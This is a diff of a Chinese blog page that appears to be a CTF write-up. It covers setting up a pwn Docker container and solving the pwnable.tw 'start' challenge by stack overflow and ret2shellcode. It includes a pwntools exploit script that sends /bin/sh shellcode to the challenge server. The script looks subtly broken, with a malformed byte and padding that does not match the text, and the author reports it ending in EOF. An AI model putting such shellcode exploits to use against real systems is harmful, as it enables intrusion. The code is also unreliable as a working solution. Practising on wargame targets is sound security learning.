@@ -194,7 +194,36 @@
 <p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.14.12.png" data-caption="截屏2021-11-03 下午10.14.12" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.14.12.png" alt="截屏2021-11-03 下午10.14.12"></a></p>
 <p>​    愉快的gdb时间（（</p>
 <p>​    还要解决的就是容器与主机交互的问题，毕竟脚本啥还是要用图形化的写比较开心。</p>
-<p>TBC…</p>
+<p>​    然后是做题时间。</p>
+<p>​    这个题尤其基础，直接溢出0x20个字符就行，ret2shellcode。</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.01.29.png" data-caption="截屏2021-11-03 下午11.01.29" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.01.29.png" alt="截屏2021-11-03 下午11.01.29"></a></p>
+<p>​    </p>
+<p>​    ps：关于cyclic的原理可以看我的pwntools源码解析系列。</p>
+<p>​    然后还是得解决主机和容器之间的信息交互，如何优雅地将主机写的脚本传进docker捏 。</p>
+<p>​    还是要借助<code>docker run</code>的- v参数，大概就是<code>~/work/pwner:/ctf/work</code></p>
+<p>​    但是比较离谱的就是copy了文件夹以后，似乎并不能立即在容器中看到，我重启之后才有效果。难道每次修改脚本都需要重启容器吗？</p>
+<p>​    后来重启一次之后就能立即同步到容器中了。好。</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.16.05.png" data-caption="截屏2021-11-03 下午11.16.05" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.16.05.png" alt="截屏2021-11-03 下午11.16.05"></a></p>
+<p>​    </p>
+<p>​    有一点离谱。</p>
+<p>​    虽然但是，我超，pwndokcer真的好用。</p>
+<p>​    鉴于我以前做过这道题，而且那时候的wp写得非常离谱，我决定重新写一遍。具体有多离谱，大概就是全程只有寻找偏移量的描述，然后exp是复制别人的。写了，但是没完全写（</p>
+<p>​    所以偏移量的寻找我就懒得写了，cyclic一把梭。并且由于cyclic是直接覆盖掉了返回地址的eip的（这也是cyclic能找到偏移量的道理所在），这个得出来的0x20也不需要加什么ebp，直接0x20+任意地址了事。</p>
+<p>​    然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。</p>
+<p>​    shellcode就没必要手写了，<code>pwntools.shallcraft</code>直接生成。</p>
+<pre><code class="python">from pwn import*
+
+p = remote('chall.pwnable.tw',10000)
+
+shellcode=b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe33\xb0\x0b\xcd\x80'
+payload = b'a'*20
+payload += shellcode
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p>​    摸了一圈，又EOF力。</p>
+<p>​    </p>
 </body></html>
 
   
@@ -204,7 +233,7 @@
     </div>
     <div class="item right">
         
-          <a href="../pwnable-start/">pawnable -- start</a>
+          <a href="../../01/docker%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">docker学习笔记</a>
         
     </div>
   </div>
